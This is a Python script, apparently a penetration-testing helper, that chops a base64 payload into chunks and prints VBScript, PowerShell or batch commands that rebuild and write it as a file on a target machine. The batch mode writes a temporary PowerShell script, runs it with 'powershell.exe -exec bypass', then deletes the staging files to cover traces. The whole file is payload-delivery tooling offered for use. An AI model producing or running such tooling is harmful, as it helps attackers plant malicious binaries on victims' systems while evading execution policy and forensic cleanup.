#!/usr/bin/env python3

import sys
import argparse

# if len(sys.argv) == 1:
#     print('Usage: {} "payload"'.format(sys.argv[0]))
#     exit(0)

# TYPES = {
#     'vbs': {'first': "Str = " + '"{}"', 'all': "Str = Str + " + '"{}"'},
#     'powershell': {'first': "Str = " + '"{}"', 'all': "Str = Str + " + '"{}"'},
# }


def do_vbs():
    payload = args.payload
    n = args.count

    for i in range(0, len(payload), n):
        if i == 0:
            print("Str = " + '"' + payload[i:i+n] + '"')
        else:
            print("Str = Str + " + '"' + payload[i:i+n] + '"')


def do_bat():
    if args.file == None:
        print("You must specify a destination file -f/--file")
        exit(0)

    payload = args.payload
    n = args.count

    # Build concatenated payload and output to text file
    for i in range(0, len(payload), n):
        if i == 0:
            print("echo " + payload[i:i+n] + " > " + args.file + '.txt')
        else:
            print("echo " + payload[i:i+n] + " >> " + args.file + '.txt')

    # Generate PowerShell to read text file and decode base64
    print('echo $payload = $null; > ' + args.file + '.ps1')
    print('echo $file = (Get-Content ' + args.file + '.txt); >> ' + args.file + '.ps1')
    print('echo foreach ($line in $file) {$payload += $line }; >> ' + args.file + '.ps1')
    print('echo $payload = $payload.Replace(" ",""); >> ' + args.file + '.ps1')
    print('echo [System.IO.File]::WriteAllBytes("' + args.file + '", >> ' + args.file + '.ps1')
    print('echo [System.Convert]::FromBase64String($payload)) >> ' + args.file + '.ps1')
    
    # Execute PS to create target file
    print('powershell.exe -exec bypass -file ' + args.file + '.ps1')

    # Cleanup
    print('del ' + args.file + '.txt')
    print('del ' + args.file + '.ps1')


def do_pwsh():
    if args.file == None:
        print("You must specify a destination file -f/--file")
        exit(0)

    payload = args.payload
    n = args.count

    # Build concatenated payload
    for i in range(0, len(payload), n):
        if i == 0:
            print("$payload = '" + payload[i:i+n] + "';")
        else:
            print("$payload += '" + payload[i:i+n] + "';")

    print('$payload = $payload.Replace(" ","");')
    # Decode payload from base64
    print('[System.IO.File]::WriteAllBytes("' + args.file +
          '", [System.Convert]::FromBase64String($payload));')


def main():
    if args.type == None:
        print("No type specified, defaulting to vbs")

    if args.type == 'vbs' or args.type == None:
        do_vbs()
    elif args.type == 'powershell':
        do_pwsh()
    elif args.type == 'bat':
        do_bat()


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument(
            '-n', '--count', help='Number of characters to split (default: 50)', default=50, type=int)
    parser.add_argument('-p', '--payload', help='Payload')
    parser.add_argument(
        '-t', '--type', choices=['vbs', 'powershell', 'bat'], help='Type')
    parser.add_argument('-f', '--file', help='Destination filepath')
    args = parser.parse_args()

    main()
